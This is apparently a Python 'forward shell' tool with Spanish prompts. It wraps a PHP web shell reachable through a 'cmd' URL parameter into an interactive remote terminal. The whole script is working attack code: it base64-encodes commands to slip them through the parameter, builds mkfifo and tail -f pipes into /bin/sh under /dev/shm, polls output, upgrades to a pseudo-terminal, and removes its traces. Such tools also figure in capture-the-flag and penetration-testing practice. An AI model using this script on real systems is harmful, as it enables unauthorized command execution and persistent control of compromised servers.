#!/usr/bin/env python3

import requests
from termcolor import colored
from base64 import b64encode
from random import randrange
import time

class ForwardShell:
    def __init__(self):
        session = randrange(1000,9999)
        self.main_url = "http://localhost/index.php"
        self.stdin = f"/dev/shm/{session}.input"
        self.stdout = f"/dev/shm/{session}.output"
        self.is_pseudo_terminal = False

    def setup_shell(self):
        command = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        self.run_command(command)

    def write_stdin(self, command):

        command = b64encode(command.encode()).decode()

        data = {
            "cmd": f"echo '{command}' | base64 -d > {self.stdin}"
        }

        r = requests.get(self.main_url, params=data)

    def read_stdout(self):
        for _ in range(5):
            read_stdout_command = f"/bin/cat {self.stdout}"
            output = self.run_command(read_stdout_command)
            time.sleep(0.1)

        return output

    def clear_stdout(self):
        clear_stdout_command = f"echo '' > {self.stdout}"
        self.run_command(clear_stdout_command)

    def run_command(self, command):

        command = b64encode(command.encode()).decode()

        data = {
            "cmd": f"echo '{command}' | base64 -d | /bin/sh"
        }

        try: 
            r = requests.get(self.main_url,params=data, timeout=5)
            return r.text
        except:
            pass;
        return None;

    def remove_data(self):
        erase_data = f"/bin/rm {self.stdin} {self.stdout}"
        self.run_command(erase_data)

    def run(self):
        self.setup_shell()
    
        while True:
            command = input(colored(f"\n>> ", "green"))
            if "script /dev/null -c bash" in command:
                print(f"\n[+] Se ha iniciado una pseudoterminal\n")
                self.is_pseudo_terminal = True;

            self.write_stdin(command + "\n")
            output = self.read_stdout()
            
            if command.strip() == "exit":
                self.is_pseudo_terminal = False;
                self.clear_stdout()
                continue

            if self.is_pseudo_terminal:
                lines = output.split("\n")

                if len(lines) == 3:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1])
                    print("\n" + cleared_output + "\n")
                elif len(lines) > 3:
                    cleared_output = '\n'.join([lines[-1]] + lines[2:-1])
                    print("\n" + cleared_output + "\n")
            else:
                print(output)
            self.clear_stdout() 

# mkfifo input; tail -f input | /bin/sh 2>&1 > output

   
